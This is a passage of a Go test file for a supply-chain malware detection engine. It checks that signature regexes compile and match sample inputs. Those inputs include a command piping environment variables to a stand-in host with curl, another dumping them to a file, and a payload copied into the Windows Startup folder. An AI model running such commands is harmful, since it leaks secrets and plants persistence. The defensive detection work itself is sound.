		name    string
		pattern string
		input   string
		match   bool
	}{
		{"wav steganography", `(?i)\.wav.*\bread\b.*\bbinary\b|\.wav.*struct\.unpack|wave\.open.*\bframes\b.*decode`, "wave.open('payload.wav') frames decode", true},
		{"startup persistence", `(?i)AppData.*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|~/\.config/autostart`, `copy payload.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"`, true},
		{"linux autostart", `(?i)AppData.*\\Microsoft\\Windows\\Start Menu\\Programs\\Startup|~/\.config/autostart`, "cp agent ~/.config/autostart/", true},
		{"hidden persistence", `(?i)/tmp/\.telnyx|/var/tmp/\.[a-z]{5,}|%LOCALAPPDATA%\\\.[a-z]{5,}`, "mkdir -p /tmp/.telnyx", true},
		{"aes rsa exfil", `(?i)AES.*256.*CBC.*RSA.*OAEP|RSA.*4096.*tpcp|OAEP.*encrypt.*tar\.gz`, "encrypt with AES 256 CBC then RSA OAEP wrap", true},
		{"compromised telnyx", `(?i)telnyx==4\.87\.1|telnyx==4\.87\.2|telnyx@4\.87\.[12]`, "telnyx==4.87.1 in requirements.txt", true},
		{"clean telnyx", `(?i)telnyx==4\.87\.1|telnyx==4\.87\.2|telnyx@4\.87\.[12]`, "telnyx==4.86.0", false},
	}

	for _, tt := range patterns {
		t.Run(tt.name, func(t *testing.T) {
			re, err := regexp.Compile(tt.pattern)
			require.NoError(t, err, "pattern %q should compile", tt.pattern)
			assert.Equal(t, tt.match, re.MatchString(tt.input),
				"pattern %q against %q", tt.pattern, tt.input)
		})
	}
}

func TestSignatureRegexCompilation_SupplyChainGeneral(t *testing.T) {
	patterns := []struct {
		name    string
		pattern string
		input   string
		match   bool
	}{
		{"env harvest to file", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "printenv > /tmp/creds.txt", true},
		{"env pipe to curl", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "env | curl -X POST -d @- https://evil.com", true},
		{"clean env usage", `(?i)(printenv|\benv\b|\bset\b)\s*>\s*[a-z/]|\benv\b.*\|.*(curl|wget|nc\b)`, "echo $GITHUB_TOKEN", false},
	}

	for _, tt := range patterns {
		t.Run(tt.name, func(t *testing.T) {
			re, err := regexp.Compile(tt.pattern)
			require.NoError(t, err, "pattern %q should compile", tt.pattern)
			assert.Equal(t, tt.match, re.MatchString(tt.input),
				"pattern %q against %q", tt.pattern, tt.input)
		})
	}
}

func TestLoadSignaturesFromDirectory(t *testing.T) {
	// Verify the engine loads signatures from the directory structure.
	engine, err := NewEngine(runnerguard.RulesFS)
	require.NoError(t, err)
	// We should have signatures from all campaign files loaded.
	// GlassWorm (6) + Cryptojacking (2) + Supply-Chain-General (3) + TeamPCP (9) + UNC1069 (6) + Telnyx (5) = 31
	assert.GreaterOrEqual(t, len(engine.signatures), 25,
		"engine should load at least 25 signatures from directory, got %d", len(engine.signatures))
}
